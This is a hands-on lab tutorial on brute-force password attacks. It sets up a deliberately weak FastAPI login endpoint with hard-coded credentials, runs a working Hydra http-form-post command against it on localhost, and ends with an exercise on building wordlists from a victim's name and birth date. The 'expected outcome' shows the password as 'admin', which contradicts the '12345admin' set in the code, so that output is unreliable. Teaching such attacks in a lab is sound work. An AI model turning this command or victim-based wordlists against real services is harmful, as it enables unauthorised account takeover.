# Lab 12. Brute-force Attacks

> Disclaimer: steps assume Ubuntu-like systems; adapt venv and package installs to your OS.

## 1) Concept

A brute-force attack tries credentials or keys exhaustively—often automated—to find a working combination.

## 2) Common variants

- Simple brute-force: all combinations, no hints.
- Dictionary: tries words or common passwords (password123, qwerty).
- Credential stuffing: reuses leaked username/password pairs on new services.
- Reverse brute-force: one common password against many usernames.
- Hybrid: dictionary plus tweaks (numbers, symbols, case changes).

## 3) Tool: Hydra

- Supports many protocols: FTP, SSH, HTTP, SMTP, MySQL, RDP, Telnet, etc.
- Fast, parallel attempts; configurable usernames/passwords per attack.
- GUI available as XHydra; modules can extend protocol support.

## 4) Build a demo target (FastAPI)

From an empty work folder:

```bash
mkdir brute-force-server
cd brute-force-server
python -m venv venv  # or python3
source venv/bin/activate
pip install "fastapi[standard]"  # or pip3
```

Create main.py:

```python
from typing import Annotated
from fastapi import FastAPI, Form

app = FastAPI()

ADMIN_USERNAME = "admin"
ADMIN_PASSWORD = "12345admin"


@app.post("/login")
def login(
    username: Annotated[str, Form()],
    password: Annotated[str, Form()]
):
    if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
        return "secret token"
    return "Invalid credentials"
```

Run the server:

```bash
fastapi dev main.py
```

## 5) Install Hydra

```bash
sudo apt update
sudo apt install hydra
```

## 6) Prepare wordlists

Place usernames.txt and passwords.txt in one directory (small provided lists or larger sets from SecLists).

## 7) Run the attack (local target)

From the wordlist directory while the FastAPI app runs on port 8000:

```bash
hydra -f -I -V -L usernames.txt -P passwords.txt -s 8000 localhost \
  http-form-post "/login:username=^USER^&password=^PASS^:F=Invalid"
```

Key flags: `-f` stop on first hit; `-I` ignore minor errors; `-V` verbose; `-L/-P` wordlists; `-s` port; `F=Invalid` marks failed responses.

## 8) Expected outcome

Hydra reports the valid pair and stops, e.g.:

```
[8000][http-post-form] host: localhost   login: admin   password: admin
[STATUS] attack finished for localhost (valid pair found)
```

## 9) Exercise

Generate custom wordlists that combine victim hints (name, surname, birth date) in different permutations and rerun Hydra to compare effectiveness.
